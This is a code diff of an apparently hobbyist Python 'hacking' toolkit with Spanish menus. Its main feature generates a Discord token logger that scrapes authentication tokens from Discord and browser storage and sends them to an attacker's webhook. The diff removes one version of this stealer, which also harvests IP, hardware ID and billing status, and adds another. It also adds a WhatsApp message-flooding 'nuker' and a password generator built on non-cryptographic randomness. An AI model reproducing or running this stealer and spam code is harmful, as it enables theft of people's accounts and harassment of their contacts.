@@ -3,8 +3,13 @@ import os
 import shutil
 import time
 import requests
+import random
 import platform
-from core import doxxing, goldenphish
+import pyautogui
+import webbrowser
+from core import doxxing, goldenphish, ser, scanner
+
+Version = "1.0.0"
 
 def clear():
     if os.name == "nt":
@@ -87,7 +92,7 @@ def creds():
                       |   Discord:                                     |
                       |   ! Spyk3r#0614                                |
                       |   Twitter:                                     |
-                      |   https://twitter.com/_Spyk33r_                |
+                      |   https://twitter.com/324Goldendark            |
                       |   Github:                                      |
                       |   https://github.com/Spyk3r                    |
                       |                                                |
@@ -109,6 +114,46 @@ def tracker():
   else:
     os.system("python3 track/omega.py")
 
+def waspam():
+    clear()
+    print(f"""{Fore.MAGENTA}
+ __          ___           _                                          _             
+ \ \        / / |         | |         /\                             | |            
+  \ \  /\  / /| |__   __ _| |_ ___   /  \   _ __  _ __    _ __  _   _| | _____ _ __ 
+   \ \/  \/ / | '_ \ / _` | __/ __/ / /\ \ | '_ \| '_ \  | '_ \| | | | |/ / _ \ '__|
+    \  /\  /  | | | | (_| | |_\__ \/ ____ \| |_) | |_) | | | | | |_| |   <  __/ |   
+     \/  \/   |_| |_|\__,_|\__|___/_/    \_\ .__/| .__/  |_| |_|\__,_|_|\_\___|_|   
+                                           | |   | |                                
+                                           |_|   |_|                               
+    """)
+    print('\n[~] Abriendo whatsapp...')
+    webbrowser.open_new_tab('https://web.whatsapp.com/')
+    m = input(f'\n{Fore.YELLOW}[~] Una vez dentro de whatsapp web, escanea el codigo qr y pulsa enter...')
+    mensaje = input(f'\n{Fore.BLUE}[~] Ingresa el mensaje que quieres enviar: ')
+    if mensaje == "" or mensaje == " ":
+        print(f'\n{Fore.RED}[!] Error debes de ingresar un mensaje.')
+        time.sleep(3)
+        waspam()
+    else:
+        cantidad = int(input(f'\n{Fore.BLUE}[~] Ingresa la cantidad de mensajes que quieres enviar: '))
+        if cantidad == 0:
+            print(f'\n{Fore.RED}[!] Error debes de ingresar una cantidad.')
+            time.sleep(3)
+            waspam()
+        elif cantidad <= 0:
+           print(f'\n{Fore.RED}[!] Error debes de ingresar una cantidad correcta.')
+           time.sleep(3)
+           waspam()
+        else:
+            print('\n[~] El mensaje se enviara en 5 segundos...')
+            time.sleep(5)
+            for _ in range(cantidad):
+                print('\n[~] Enviando mensaje...')
+                pyautogui.typewrite(mensaje)
+                pyautogui.press('Enter')
+            menu()
+
+
 def tokenlogger():
     clear()
     print(f"""{Fore.LIGHTBLUE_EX}
@@ -127,167 +172,80 @@ def tokenlogger():
     f.write('''import os
 if os.name != "nt":
     exit()
-from re import findall
-from json import loads, dumps
-from base64 import b64decode
-from subprocess import Popen, PIPE
+import os
+import re
+import json
 from urllib.request import Request, urlopen
-from datetime import datetime
-from threading import Thread
-from time import sleep
-from sys import argv
-LOCAL = os.getenv("LOCALAPPDATA")
-ROAMING = os.getenv("APPDATA")
-PATHS = {
-    "Discord"           : ROAMING + "\\\\Discord",
-    "Discord Canary"    : ROAMING + "\\\\discordcanary",
-    "Discord PTB"       : ROAMING + "\\\\discordptb",
-    "Google Chrome"     : LOCAL + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
-    "Opera"             : ROAMING + "\\\\Opera Software\\\\Opera Stable",
-    "Brave"             : LOCAL + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
-    "Yandex"            : LOCAL + "\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default"
-}
-def getheaders(token=None, content_type="application/json"):
-    headers = {
-        "Content-Type": content_type,
-        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
-    }
-    if token:
-        headers.update({"Authorization": token})
-    return headers
-def getuserdata(token):
-    try:
-        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
-    except:
-        pass
-def gettokens(path):
-    path += "\\\\Local Storage\\\\leveldb"
+
+WEBHOOK = 'webnook'
+
+PING_ME = True
+
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
+
     tokens = []
+
     for file_name in os.listdir(path):
-        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
             continue
-        for line in [x.strip() for x in open(f"{path}\\\\{file_name}", errors="ignore").readlines() if x.strip()]:
-            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-                for token in findall(regex, line):
+
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
                     tokens.append(token)
     return tokens
-def getip():
-    ip = "None"
-    try:
-        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-    except:
-        pass
-    return ip
-def getavatar(uid, aid):
-    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
-    try:
-        urlopen(Request(url))
-    except:
-        url = url[:-4]
-    return url
-def gethwid():
-    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-    return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]
-def getchat(token, uid):
-    try:
-        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
-    except:
-        pass
-def has_payment_methods(token):
-    try:
-        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
-    except:
-        pass
-def send_message(token, chat_id, form_data):
-    try:
-        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
-    except:
-        pass
+
 def main():
-    cache_path = ROAMING + "\\\\.cache~$"
-    embeds = []
-    working = []
-    checked = []
-    already_cached_tokens = []
-    working_ids = []
-    ip = getip()
-    pc_username = os.getenv("UserName")
-    pc_name = os.getenv("COMPUTERNAME")
-    for platform, path in PATHS.items():
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    }
+
+    message = '@everyone' if PING_ME else ''
+
+    for platform, path in paths.items():
         if not os.path.exists(path):
             continue
-        for token in gettokens(path):
-            if token in checked:
-                continue
-            checked.append(token)
-            uid = None
-            if not token.startswith("mfa."):
-                try:
-                    uid = b64decode(token.split(".")[0].encode()).decode()
-                except:
-                    pass
-                if not uid or uid in working_ids:
-                    continue
-            user_data = getuserdata(token)
-            if not user_data:
-                continue
-            working_ids.append(uid)
-            working.append(token)
-            username = user_data["username"] + "#" + str(user_data["discriminator"])
-            user_id = user_data["id"]
-            avatar_id = user_data["avatar"]
-            avatar_url = getavatar(user_id, avatar_id)
-            email = user_data.get("email")
-            phone = user_data.get("phone")
-            nitro = bool(user_data.get("premium_type"))
-            billing = bool(has_payment_methods(token))
-            embed = {
-                "color": 0x7289da,
-                "fields": [
-                    {
-                        "name": "**Informacion de la Cuenta**",
-                        "value": f'Email: {email}\\Telefono: {phone}\\Nitro: {nitro}\\Información de Facturación: {billing}',
-                        "inline": True
-                    },
-                    {
-                        "name": "**Informacion de la PC**",
-                        "value": f'IP: {ip}\\Nombre de Usuario: {pc_username}\\Nombre de la PC: {pc_name}\\Ubicacion de la Token: {platform}',
-                        "inline": True
-                    },
-                    {
-                        "name": "**Token**",
-                        "value": token,
-                        "inline": False
-                    }
-                ],
-                "author": {
-                    "name": f"{username} ({user_id})",
-                    "icon_url": avatar_url
-                },
-                "footer": {
-                
-                }
-            }
-            embeds.append(embed)
-    with open(cache_path, "a") as file:
-        for token in checked:
-            if not token in already_cached_tokens:
-                file.write(token + "\\n")
-    if len(working) == 0:
-        working.append('123')
-    webhook = {
-        "content": "",
-        "embeds": embeds,
-        "username": "Discord Token Logger - By GoldenDark",
-        "avatar_url": "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/649adf24-60c9-4b7c-8ccf-e828ce51825d/dddqxj0-12dc5989-6e8e-4a0f-bf9f-887a5db96b18.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOiIsImlzcyI6InVybjphcHA6Iiwib2JqIjpbW3sicGF0aCI6IlwvZlwvNjQ5YWRmMjQtNjBjOS00YjdjLThjY2YtZTgyOGNlNTE4MjVkXC9kZGRxeGowLTEyZGM1OTg5LTZlOGUtNGEwZi1iZjlmLTg4N2E1ZGI5NmIxOC5wbmcifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6ZmlsZS5kb3dubG9hZCJdfQ.kHjYfE48SYiPGR0M3GHDyRNbP8Iw87SumhIH7pjOKUo"
+
+        message += f'\n**{platform}**\n```\n'
+
+        tokens = find_tokens(path)
+
+        if len(tokens) > 0:
+            for token in tokens:
+                message += f'{token}\n'
+        else:
+            message += 'No tokens found.\n'
+
+        message += '```'
+
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
     }
+
+    payload = json.dumps({'content': message})
+
     try:
-        urlopen(Request("WEBHOOK", data=dumps(webhook).encode(), headers=getheaders()))
+        req = Request(WEBHOOK, data=payload.encode(), headers=headers)
+        urlopen(req)
     except:
         pass
-main()'''.replace("WEBHOOK", variable_hook))
+
+if __name__ == '__main__':
+    main()'''.replace("webnook", variable_hook))
     f.close()
     print(f'\n{Fore.YELLOW}[~] Compilando token logger...')
+    time.sleep(2)
     print(f'\n{Fore.YELLOW}[~] Detectando os...')
     if platform.system() == "Linux":
         print(
@@ -343,6 +301,36 @@ main()'''.replace("WEBHOOK", variable_hook))
         time.sleep(2)
         menu()
 
+def gen():
+    clear()
+    print(f"""{Fore.LIGHTCYAN_EX}
+....................../´¯/)             
+....................,/¯../
+.................../..../
+............./´¯/'...'/´¯¯`·¸
+........../'/.../..../......./¨¯\\
+........('(...´...´.... ¯~/'...')
+.........\.................'...../
+..........''...\.......... _.·´
+............\..............(
+..............\.............\...
+    """)
+    tam = int(input(f'\n{Fore.YELLOW}[~] Ingresa la longitud de la contraseña (Maximo 77): '))
+    if tam == 77:
+        print(f'\n{Fore.RED}[!] Error la contraseña solo puede tener una longitud menos de 77.')
+        time.sleep(3)
+        gen()
+    elif tam <= 77:
+       caracter = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&*(){}[]/\?!@#$abcdefghijklmnopqrstuvwxyz"
+       contra = "".join(random.sample(caracter, tam))
+       print(f'\n{Fore.GREEN}[~] Contraseña generada: {contra}')
+       m = input(f'\n{Fore.LIGHTCYAN_EX}[~] Presiona enter para continuar...')
+       menu()
+    elif tam >= 77:
+        print(f'\n{Fore.RED}[!] Error la contraseña solo puede tener una longitud menos de 77.')
+        time.sleep(3)
+        gen()
+
 
 def menu():
     clear()
@@ -358,17 +346,17 @@ def menu():
   |                                           |     MENU      |                                                     |
   |                                           |---------------|                                                     |
   |                                                                                                                 |
-  |________________$$$$$                                                                                            |
-  |______________$$____$$                           [1] Token Logger Creator discord                                |
+  |________________$$$$$                            [1] Token Logger Creator discord                                |
   |______________$$____$$                           [2] IP Tracker                                                  |
   |______________$$____$$                           [3] WebHook spam discord                                        |
   |______________$$____$$                           [4] Tools Installer                                             |
-  |______________$$____$$                           [00] Creditos                                                   |  
-  |__________$$$$$$____$$$$$$                       [99] Salir                                                      |
-  |________$$____$$____$$____$$$$                                                                                   |
-  |________$$____$$____$$____$$__$$                                                                                 |
-  |$$$$$$__$$____$$____$$____$$____$$                                                                               |
-  |$$____$$$$________________$$____$$                                                                               |
+  |______________$$____$$                           [5] User searcher                                               |
+  |______________$$____$$                           [6] Scanner con nmap                                            |  
+  |__________$$$$$$____$$$$$$                       [7] Generar contraseñas                                         |
+  |________$$____$$____$$____$$$$                   [8] WhatsApp nuker                                              |
+  |________$$____$$____$$____$$__$$                 [00] Creditos                                                   |
+  |$$$$$$__$$____$$____$$____$$____$$               [98] Update checker                                             |
+  |$$____$$$$________________$$____$$               [99] Salir                                                      |
   |$$______$$______________________$$                                                                               |
   |__$$____$$______________________$$                                                                               |
   |___$$$__$$______________________$$                                                                               |
@@ -391,8 +379,28 @@ def menu():
         spam()
     elif prompt == "4":
         tools()
+    elif prompt == "5":
+        ser.ser_menu()
+    elif prompt == "6":
+        scanner.scan()
+    elif prompt == "7":
+        gen()
+    elif prompt == "8":
+        waspam()
     elif prompt == "00":
         creds()
+    elif prompt == "98":
+        version = requests.get('ey.txt')
+        if version.status_code == 200:
+            c = version.text
+            if c == Version:
+                print(f'\n{Fore.GREEN}[~] No hay versiones disponibles.')
+                m = input(f'\n{Fore.LIGHTCYAN_EX}[~] Presiona enter para continuar...')
+                menu()
+            else:
+                print(f'\n{Fore.GREEN}[~] Una nueva version hay disponible: {c}')
+                m = input(f'\n{Fore.LIGHTCYAN_EX}[~] Presiona enter para continuar...')
+                menu()
     elif prompt == "99":
         exit()
     else:
